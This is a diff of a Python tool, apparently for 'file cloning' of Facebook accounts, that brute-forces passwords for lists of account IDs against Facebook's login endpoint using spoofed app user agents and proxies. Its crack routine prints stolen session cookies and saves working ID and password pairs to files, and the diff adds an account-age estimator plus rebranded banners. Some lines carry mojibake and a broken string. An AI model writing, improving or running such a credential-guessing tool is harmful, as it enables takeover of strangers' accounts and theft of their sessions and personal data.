@@ -1,4 +1,3 @@
-#MAKED-BY-RJ-SHANTO
 #GITHUB-SHANTO-KING
 #ACTIVE FILE CLONING
 #ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT USE FILE 10000 
@@ -28,12 +27,14 @@ from rich.text import Text as tekz
 pretty.install()
 CON=sol()
 #------------------[ USER-AGENT ]-------------------#
-ua = '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
-ua = '[FBAN/FB4A;FBAV/79.0.3945.147;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/Redmi K30S Ultra;FBBD/XiaoMi;FBPN/com.facebook.katana;FBDV/Redmi K30S Ultra;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
-ua = '[FBAN/Orca-Android;FBAV/396.1.0.28.104;FBPN/com.facebook.orca;FBLC/pl_PL;FBBV/429650999;FBCR/PLAY (T-Mobile);FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 8T;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1'
-ua = ["Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64]",]
-ua = 'Mozilla/5.0 (Linux; U; Android 11; ru-ru; Mi 11 LE Build/RKQ1.210503.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.16.2-gn'
-ua = ["Mozilla/5.0 (Linux; Android 11; SM-S205DL Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111;]",]
+ ua = 'Mozilla/5.0 (Linux; Android 13; 21081111RG Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64]",]
+ ua = 'Mozilla/5.0 (Linux; Android 13; TECNO KI7 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]'
+ ua = 'Mozilla/5.0 (Linux; U; Android 12; en-gb; Mi 10T Pro Build/SKQ1.211006.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.35.0-gn'
+ ua = 'Mozilla/5.0 (Linux; Android 13; 2210132C Build/TKQ1.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.22.49;]'
+ ua = 'Mozilla/5.0 (Linux; Android 12; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
+ ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15'
+ ua = 'Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30'
+
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -145,6 +146,40 @@ thn = datetime.datetime.now().year
 okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
 cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
  
+ 
+#----------------------[CHECK CREATION YEAR]----------------#         
+def joined(cid):
+    if len(cid)==15:
+        if cid[:10] in ['1000000000']       :creation = ' 2009'
+        elif cid[:9] in ['100000000']       :creation = ' 2009'
+        elif cid[:8] in ['10000000']        :creation = ' 2009'
+        elif cid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:creation = ' 2009'
+        elif cid[:7] in ['1000006','1000007','1000008','1000009']:creation = ' 2010'
+        elif cid[:6] in ['100001']          :creation = ' 2010 | 2011'
+        elif cid[:6] in ['100002','100003'] :creation = ' 2011 | 2012'
+        elif cid[:6] in ['100004']          :creation = ' 2012 | 2013'
+        elif cid[:6] in ['100005','100006'] :creation = ' 2013 | 2014'
+        elif cid[:6] in ['100007','100008'] :creation = ' 2014 | 2015'
+        elif cid[:6] in ['100009']          :creation = ' 2015' 
+        elif cid[:5] in ['10001']           :creation = ' 2015 | 2016'
+        elif cid[:5] in ['10002']           :creation = ' 2016 | 2017'
+        elif cid[:5] in ['10003']           :creation = ' 2018 | 2019'
+        elif cid[:5] in ['10004']           :creation = ' 2019 | 2020'
+        elif cid[:5] in ['10005']           :creation = ' 2020'
+        elif cid[:5] in ['10006','10007']   :creation = ' 2021'
+        elif cid[:5] in ['10008']           :creation = ' 2022/2023'
+        elif cid[:5] in ['10009']           :creation = ' 2023'
+        elif cid[:5] in ['61550']           :creation = ' 2023'
+        else:creation=''
+    elif len(cid) in [9,10]:
+        creation = ' 2008 | 2009'
+    elif len(cid)==8:
+        creation = ' 2007 | 2008'
+    elif len(cid)==7:
+        creation = ' 2006 | 2007'
+    else:creation=''
+    return creation
+ 
 def alvino_xy(u):
         for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
 def SHANTOj(u):
@@ -170,27 +205,24 @@ while attemps < 12345677901:
         attemps += 1
         continue
 os.system('clear')
+
 #------------------[ MAIN ]-----------------#
 
 def banner():
 	os.system("clear")
 	print (f"""
-\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-    ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
-    ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
-    ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
-\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝               \033[0;92m
-╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
-║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
-╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
-\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
-   Author       • \33[1;38mRJ-SHANTO \33[1;38m     \033[1;31m 
-   Facebook     • SH AN TO      \033[1;97m  
-   Github       • \33[1;38mSHANTO-KING    \33[1;34m   
-   Whatsapp     • 013108682**   \33[1;35m 
-   TOOLS        • PRIVATE            \33[1;32m   
-   VERSION      • 0.1           \033[1;35m 
-\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m""")
+\033[0;92m  
+   ░█▀▀▀█ ░█─░█ ─█▀▀█ ░█▄─░█ ▀▀█▀▀ ░█▀▀▀█ 
+   ─▀▀▀▄▄ ░█▀▀█ ░█▄▄█ ░█░█░█ ─░█── ░█──░█ 
+   ░█▄▄▄█ ░█─░█ ░█─░█ ░█──▀█ ─░█── ░█▄▄▄█
+                                            \033
+===============================================
+  Auther        :  RJ SHANTO
+  Facebook      :  SH AN TO 
+  TOOLS         :  PRIVATE
+  Version       :  V-2
+  WhatsApp      :  013108682**
+=============================================== \033[1;31m""")
 def login():
 	banner()
 	SHANTOj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Contact With Admin\n\033[0;97m[0] \033[0;91mEXIT ')
@@ -402,8 +434,8 @@ def setting():
 		for bacot in id:
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
-	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD FIRE.. ')
-	os.system('espeak -a 300 " 1,  method,  FIRE"')
+	print('\x1b[1;92m ACTIVE FILE\n\x1b[1;97m [1] METHOD RJ.. ')
+	os.system('espeak -a 300 " 1,  method,  RJ"')
 	hc = input(' CHOOSE: ')
 	if hc in ['1','01']:
 		method.append('mobile')
@@ -475,7 +507,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo}[🤍SHANTO🤍] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}🤍{P}[{h}Ok{P}🤍{bo}{ok}{P}] "),
+	sys.stdout.write(f"\r{bo}[SHANTO] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}{P}[{h}Ok {P}{bo}{ok}{P}] "),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -493,9 +525,9 @@ def crack(idf,pwv):
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				#SHANTO-King
-				print(f'\r\033[0;94m[{time.strftime("%H:%M")}â€¢SHANTO-Cp] {idf} â€¢ {pw}\n\033[0;93[ðŸ¤Ÿ]= COOKIESâ€¢ \033[0;92m{kuki} ')     
+				print(f'\r\033[0;94m[{time.strftime("%H:%M")}SHANTO-Cp] {idf}  {pw}\n\033[0;93 COOKIES \033[0;92m{kuki} ')     
 				os.system('espeak -a 300 " C,  P"')
-			    #open('CP/'+cpc,'a').write(idf+' | '+pw+'\n')
+			    ##open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
@@ -504,7 +536,7 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#SHANTO-King
-				print(f'\r\033[0;92m[SHANTO-🤍-OK] {idf} 🤍 {pw}\n\033[0;93m[🤍]= COOKIES 🤍 \033[0;92m{kuki} ')
+				print(f'\r\033[0;92m[SHANTO-OK] {idf}  {pw}\n\033[0;93mCOOKIES  \033[0;92m{kuki} ')
 				print('\033[0;94m===============================================')
 				os.system('espeak -a 300 " SHANTO,  Ok,  id"')
 				open('OK/'+okc,'a').write(idf+' â€¢ '+pw+'\n')
